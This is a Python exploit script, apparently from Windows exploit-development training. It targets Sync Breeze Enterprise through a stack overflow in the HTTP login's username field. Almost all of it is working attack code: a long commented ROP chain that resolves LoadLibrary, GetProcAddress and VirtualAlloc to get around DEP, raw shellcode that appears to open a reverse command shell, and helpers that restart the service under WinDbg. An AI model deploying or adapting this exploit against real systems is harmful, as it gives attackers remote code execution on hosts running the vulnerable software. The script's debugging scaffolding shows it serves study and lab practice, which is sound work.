import socket
import time
import subprocess
from struct import *


server = "127.0.0.1"
port = 80

bad_bytes = b"\x00\x0a\x0d\x25\x26\x3d"

process_name = "syncbrs.exe"
service_name = "Sync Breeze Enterprise"

def start_service_and_get_pid():
	global service_name
	# Start the service
	subprocess.call(
		f'cmd /c sc start "{service_name}"',
		shell=True,
		stdout=subprocess.DEVNULL,
		stderr=subprocess.DEVNULL
	)

	# Poll until PID is available
	for _ in range(20):
		try:
			output = subprocess.check_output(
				f'cmd /c sc queryex "{service_name}"',
				shell=True,
				stderr=subprocess.DEVNULL
			).decode(errors="ignore")

			for line in output.splitlines():
				if "PID" in line:
					pid = int(line.split(":")[1].strip())
					return pid
		except:
			pass

		time.sleep(0.5)

	raise RuntimeError("Failed to obtain service PID")
def start_process():
	windbg = r"C:\Program Files\Windows Kits\10\Debuggers\x86\windbg.exe"
	
	pid = start_service_and_get_pid()
	print(f"[+] Attached to service PID {pid}")

	cmds = (
		windbgcmds
	)

	subprocess.Popen([
		windbg,
		"-hd",
		"-p", str(pid),
		#"-WF", r"C:\Users\offsec\Desktop\t.WEW",
		"-W", "osed_layout",
		"-c", cmds
	])

	# Give WinDbg time to attach
	time.sleep(2)
def kill_process():
	subprocess.call(
		'cmd /c taskkill /F /IM {}'.format(process_name),
		shell=True,
		#stdout=subprocess.DEVNULL,
		#stderr=subprocess.DEVNULL
	)
	subprocess.call(
		'cmd /c taskkill /F /IM windbg.exe',
		shell=True,
		#stdout=subprocess.DEVNULL,
		#stderr=subprocess.DEVNULL
	)

def packme(val):
	return pack("<I", val)

windbgcmds = 'bp 0x10136ab5; bp KERNEL32!VirtualAllocStub;g;' #'bp 0048048F;g;'

def send_payload():

	va_string = b"VirtualAlloc"
	
	skeleton  = pack("<L", (0x45454545)) # dummy LoadLibraryA Address
	skeleton += pack("<L", (0x46464646)) # LoadLibraryA Return Address
	skeleton += pack("<L", (0x47474747)) # kernel32 string address
	skeleton += pack("<L", (0x48484848)) # dummy 
	skeleton += pack("<L", (0x49494949)) # dummy 
	skeleton += pack("<L", (0x51515151)) # dummy

	shellcode = b"\x90" *100+ (b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x31\xc0\x83\xc0\x05\x83\xc0\x07\x8b\x34\x06\x8b\x76\x1c\x8b\x5e\x08\x31\xc0\x83\xc0\x10\x83\xc0\x10\x8b\x3c\x06\x8b\x36\x66\x39\x4f\x18\x75\xea\xeb\x06\x5e\x89\x75\x04\xeb\x64\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x31\xf6\x83\xc6\x10\x83\xc6\x10\x8b\x04\x37\x01\xd8\x89\x45\xfc\xe3\x3e\x90\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x13\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xde\x8b\x57\x24\x01\xda\x31\xc0\x01\xc8\x01\xc8\x01\xd0\x66\x8b\x08\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x3a\x6f\xa8\xb8\xff\x55\x04\x89\x45\x10\x68\x45\xf7\x8f\x3b\xff\x55\x04\x89\x45\x14\x68\x2e\x80\x0e\x81\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\x5b\xed\x13\xe9\xff\x55\x04\x89\x45\x1c\x68\xa2\xc9\x33\xad\xff\x55\x04\x31\xf6\x83\xc6\x10\x01\xee\x83\xc6\x10\x89\x06\x68\x55\xab\xdd\xad\xff\x55\x04\x89\x45\x24\x89\xe0\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\x31\xc9\x83\xc1\x10\x83\xc1\x10\x01\xe9\xff\x11\x89\xc6\x31\xc0\x50\x50\x31\xc9\x81\xc1\xf6\xf5\xf5\x7e\xf7\xd9\x51\x66\xb8\x11\x5c\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31\xc9\x66\x89\xc1\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10")
	
	offset = b"A" * (780 - len(skeleton)-len(va_string)) + va_string
	
	rop = packme(0x10136ab5) # push esp ; and al, 0x08 ; pop esi ; add esp, 0x08 ; ret
	rop += packme(0x41414141) * 3 # junk for add esp, 0x08 and previous ret 0x4
	#esi has a copy of ESP
	rop += packme(0x10132e5a) # mov eax, esi ; pop esi ; pop ebx ; ret 
	rop += packme(0x41414141) #junk for esi and ebx
	rop += packme(0x41414141) #junk for esi and ebx
	# eax holds ESP now
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xffffffe0) # ebp
	rop += packme(0x100fcd71) # add eax, ebp ; dec ecx ; ret 
	# eax points to our dummy placeholder LoadLibrary Address now
	rop += packme(0x100baecb) # xchg eax, ecx ; ret 
	# ecx points to our dummy LoadLibrary Address now
	rop += packme(0x1002f729) # pop eax ; ret  ;
	rop += packme(0x101681D4) # WriteStringEx at IAT at libpal from libspp
	# Dereference WriteStringEx
	rop += packme(0x1014dc4c) # mov eax, dword [eax] ; ret  ;
	#Eax holds the address of WriteStringEx in libpal

	# we need to add 0x74254 to the dereferenced WriteStringEx to get LoadLibrary at IAT
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xfff8bdac) # ebp, -0x74254
	rop += packme(0x1014c190) # sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
	#eax should hold LoadLibrary at IAT

	#dereference
	rop += packme(0x1014dc4c) # mov eax, dword [eax] ; ret  ;
# Write address of LoadLibrary to placeholder skeleton
	rop += packme(0x10114901) # mov dword [ecx], eax ; retn 0x000C ;

	rop += packme(0x1010adf1) # inc ecx ; ret  ;	
	rop += packme(0x41414141)*3 #junk for retn 0x000C
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	# we need to write the return address of the function (LoadLibrary) before we
	# start populating the arguments
	rop += packme(0x1002f729) # pop eax ; ret  ;
	rop += packme(0x100eae11) # add esp, 0x000002F0 ; retn 0x0010  # this is the gadget after LoadLibrary returns	
# Write the return Address after LoadLibrary returns
	rop += packme(0x10114901) # mov dword [ecx], eax ; retn 0x000C ;

	rop += packme(0x1010adf1) # inc ecx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	# ecx points to the address where we need to write the pointer to the string that
	# contains the DLL name (LPCSTR lpLibFileName)
	# We need to fix eax to a pointer to the string kernel32.dll (found at 101835fc in libspp)
	rop += packme(0x1002f729) # pop eax ; ret  ;
	rop += packme(0x101835fc) # 
# Write the argument, the pointer to the KERNEL32 string (name of DLL)
	rop += packme(0x10114901) # mov dword [ecx], eax ; retn 0x000C ;

# Ready to call LoadLibrary
	#align esp
	rop += packme(0x100baecb) #xchg eax, ecx ; ret
	rop += packme(0x41414141)*3 #junk for retn 0xc
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xfffffff4) # align eax with rop skeleton minus 4 for the pop ebp below
	rop += packme(0x100fcd71) # add eax, ebp ; dec ecx ; ret 
	# eax points to the start of the skeleton
	rop += packme(0x1014426e) #xchg eax, ebp ; ret  ;
	rop += packme(0x10126e48) #mov esp, ebp ; pop ebp ; ret  ;

	#Filler
	rop += b"\xee" * (0x2f0-len(rop)-12)

	# eax holds the base address of kernel32.dll
	# copy to ecx
	rop += packme(0x100baecb) #xchg eax, ecx ; ret
	rop += packme(0x41414141) * 4 # due to the use of  #add esp, 0x000002F0 ; retn 0x0010	
	rop += packme(0x10136ab5) #0x10136ab5 push esp ; and al, 0x08 ; pop esi ; add esp, 0x08 ; ret
	rop += packme(0x41414141) * 2 # due to add esp, 0x08
	# esi has a copy of ESP
	rop += packme(0x10132e5a) #0x10132e5a mov eax, esi ; pop esi ; pop ebx ; ret 
	rop += packme(0x41414141) #junk for esi and ebx
	rop += packme(0x41414141) #junk for esi and ebx
	# eax holds ESP now (a reference point in the stack)
	rop += packme(0x100baecb) #xchg eax, ecx ; ret
	# restore registers:
	# eax holds the base address of kernel32.dll
	# ecx points to our stack reference
	# The skeleton will need the GetProcAddress, followed by the return address followed by the arguments (hModule, lpProcName)
# So we need to write eax at ecx + 8 (first argument, hModule)
	rop += packme(0x1010adf1)*8 # inc ecx ; ret  ;
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;

	# Restore ECX to point to the first position in our skeleton
	rop += packme(0x100fcd73) # dec ecx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
	rop += packme(0x100fcd73) # dec ecx ; ret  ;
	rop += packme(0x100fcd73) # dec ecx ; ret  ;
	rop += packme(0x100fcd73) # dec ecx ; ret  ;
	rop += packme(0x100fcd73)*4 # dec ecx ; ret  ;
	# ecx points to GetProcAddress placeholder in our skeleton, 8 bytes before hModule
	rop += packme(0x1002f729) #pop eax ; ret  ;
	rop += packme(0x101681D4) # WriteStringEx at IAT at libpal from libspp
	# Dereference WriteStringEx
	rop += packme(0x1014dc4c) #mov eax, dword [eax] ; ret  ;
	#Eax holds the address of WriteStringEx in libpal

	# in this case we need to add 0x00074224 to the dereferenced WriteStringEx to get the GetProcAddress at IAT of libpal
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xfff8bddc) # ebp, -0x74224
	rop += packme(0x1014c190) #sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
	# eax should hold GetProcAddress at IAT of libpal
	# dereference

	rop += packme(0x1014dc4c) #mov eax, dword [eax] ; ret  ;
# Write address of first instruction of GetProcAddress to skeleton
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;

	rop += packme(0x1010adf1) # inc ecx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	# ecx points to the return address placeholder in our skeleton
	# we need to write the return address of the function before the first argument
	rop += packme(0x1002f729) #pop eax ; ret  ;
	rop += packme(0x10044e9b) #add esp, 0x00000208 ; ret  # this is the gadget after GetProcAddr returns	
# Write the return address after GetProcAddr returns to the skeleton
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;

	# We need to add the null byte at the end of our "VirtualAlloc" string
	# We need to align ecx with the address of the placeholder in our skeleton
	# and also align eax with the start of the null terminated "VirtualAlloc" string
	
	rop += packme(0x10136ab5) # push esp ; and al, 0x08 ; pop esi ; add esp, 0x08 ; ret
	rop += packme(0x41414141) * (2+3) # junk for add esp, 0x08 + retn 0x000C
	#esi has a copy of ESP
	rop += packme(0x10132e5a) #0x10132e5a mov eax, esi ; pop esi ; pop ebx ; ret 
	rop += packme(0x41414141) #junk for esi and ebx
	rop += packme(0x41414141) #junk for esi and ebx
	# eax holds the reference to ESP now

	# align eax with the end of the VirtualAlloc string
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xffff9c77-len(va_string)) # ebp, the 0xffff9c77 is for the start of the string
	rop += packme(0x1014c168) # sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret  ;  (1 found)
	rop += packme(0x41414141) * 3 # junk for esi,ebp,ebx

	rop += packme(0x100baecb) #xchg eax, ecx ; ret
	#ecx points to the end of the VirtualAlloc string. need to place \x00 there
	
	rop += packme(0x1015707a) #xor eax, eax ; ret  ;
	#Write the null byte at the end of VirtualAlloc string
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;

	rop += packme(0x100baecb) #xchg eax, ecx ; ret 
	rop += packme(0x41414141)*3 #junk for retn 0x000C

	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xffff9bab) # ebp, prepare to set ecx to point back to placeholder
	rop += packme(0x100fcd71) # add eax, ebp ; dec ecx ; ret 
	rop += packme(0x100baecb) #xchg eax, ecx ; ret
	#ecx points to the placeholder where the pointer to the string of VirtualAlloc should be

	rop += packme(0x10136ab5) #0x10136ab5 push esp ; and al, 0x08 ; pop esi ; add esp, 0x08 ; ret
	rop += packme(0x41414141) * 2
	#esi has a copy of ESP
	rop += packme(0x10132e5a) #0x10132e5a mov eax, esi ; pop esi ; pop ebx ; ret 
	rop += packme(0x41414141) #junk for esi and ebx
	rop += packme(0x41414141) #junk for esi and ebx
	# eax holds ESP now
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xffff9cd3) # ebp, set eax to point to the start of virtualalloc string again
	rop += packme(0x1014c168) #0x1014c168 sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret  ;  (1 found)
	rop += packme(0x41414141) * 3 # junk for esi,ebp,ebx
	# eax points to the start of the VirtualAlloc string
# Write the pointer to the VirtualAlloc string to the placeholder in the skeleton
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;


#Prepare to call GetProcAddr
	#align esp
	rop += packme(0x100baecb) #xchg eax, ecx ; ret
	rop += packme(0x41414141)*3 #junk for retn 0xc
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xfffffff0) # align eax with rop skeleton minus 4 for the pop ebp below
	rop += packme(0x100fcd71) #0x100fcd71 add eax, ebp ; dec ecx ; ret 
	# eax points to the start of the skeleton
	rop += packme(0x1014426e) #xchg eax, ebp ; ret  ;
	rop += packme(0x10126e48) #mov esp, ebp ; pop ebp ; ret  ;

	#Filler/retslide
	rop += packme(0x10044ea1)*25*4 # ret, retslide

#eax holds address of first instruction of virtualalloc
	#copy to ecx
	rop += packme(0x100baecb) #xchg eax, ecx ; ret
	rop += packme(0x10136ab5) #0x10136ab5 push esp ; and al, 0x08 ; pop esi ; add esp, 0x08 ; ret
	rop += packme(0x41414141) * 2
	#esi has a copy of ESP
	rop += packme(0x10132e5a) #0x10132e5a mov eax, esi ; pop esi ; pop ebx ; ret 
	rop += packme(0x41414141) #junk for esi and ebx
	rop += packme(0x41414141) #junk for esi and ebx
	# eax holds ESP now
	rop += packme(0x100baecb) #xchg eax, ecx ; ret
	# eax has the address of virtualalloc
	# ecx points to the stack from previously
#Write the address of VirtualAlloc to wherever ecx points <- that will be the new skeleton
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;

	rop += packme(0x1010adf1) # inc ecx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	# copy ecx to eax so now eax has a reference to ESP/stack
	rop += packme(0x100284be) #mov eax, ecx ; ret  ;
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xfffffe9c) # ebp, align eax so it points (at least near) the shellcode
	rop += packme(0x1014c190) #sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
# Write the return address of VirtualAlloc a.k.a the address of our Shellcode
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;

	rop += packme(0x1010adf1) # inc ecx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
#Write lpAddress, same as before, the address to our shellcode
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;

	rop += packme(0x1010adf1) # inc ecx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	#craft dwSize 0x611
	rop += packme(0x1015707a) #xor eax, eax ; ret  ;
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xfffff9ef) # ebp, -0x611
	rop += packme(0x1014c190) #sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret  ;
	rop += packme(0x41414141)*3 #junk
# Write dwSize to our skeleton
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;

	rop += packme(0x1010adf1) # inc ecx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	#craft flAllocationType 0x1000
	rop += packme(0x1002f729) #pop eax ; ret  ;
	rop += packme(0x77777777) # eax
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0x88889889) # ebp,
	rop += packme(0x100fcd71) #0x100fcd71 add eax, ebp ; dec ecx ; ret 
	# Restore ecx
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
# Write flAllocationType to our skeleton
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;

	rop += packme(0x1010adf1) # inc ecx ; ret  ;	
	rop += packme(0x41414141)*3 #junk
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	rop += packme(0x1010adf1) # inc ecx ; ret  ;
	#craft flProtect 0x40
	rop += packme(0x1015707a) #xor eax, eax ; ret  ;
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xffffffc0) # ebp, -0x40
	rop += packme(0x1014c190) #sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret  ;
	rop += packme(0x41414141)*3 #junk
# Write flProtect to our skeleton
	rop += packme(0x10114901) #mov dword [ecx], eax ; retn 0x000C ;
	
#Prepare to call VirtualAlloc
	#align esp
	rop += packme(0x100baecb) #xchg eax, ecx ; ret
	rop += packme(0x41414141)*3 #junk for retn 0xc
	rop += packme(0x101547ae) # pop ebp ; ret 
	rop += packme(0xffffffe8) # ebp, -0n24
	rop += packme(0x100fcd71) #0x100fcd71 add eax, ebp ; dec ecx ; ret 
	# eax points to the start of the skeleton
	rop += packme(0x1014426e) #xchg eax, ebp ; ret  ;
	rop += packme(0x10126e48) #mov esp, ebp ; pop ebp ; ret  ;

	inputBuffer = offset+skeleton+rop+shellcode

	content = b"username=" + inputBuffer + b"&password=A"
	buffer = b"POST /login HTTP/1.1\r\n"
	buffer += b"Host: " + server.encode() + b"\r\n"
	buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
	buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
	buffer += b"Referer: http://10.11.0.22/login\r\n"
	buffer += b"Connection: close\r\n"
	buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
	buffer += b"\r\n"
	buffer += content

	print("Sending evil buffer...")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))
	s.send(buffer)
	s.close()
	print("Done!")


import traceback
try:
	dbg = 'y'
	if dbg == 'y':
		kill_process()
		time.sleep(3)
		start_process()
	
	send_payload()
	
	input("Press Enter to exit...")
except Exception:
	traceback.print_exc()
	input("Press Enter to exit...")
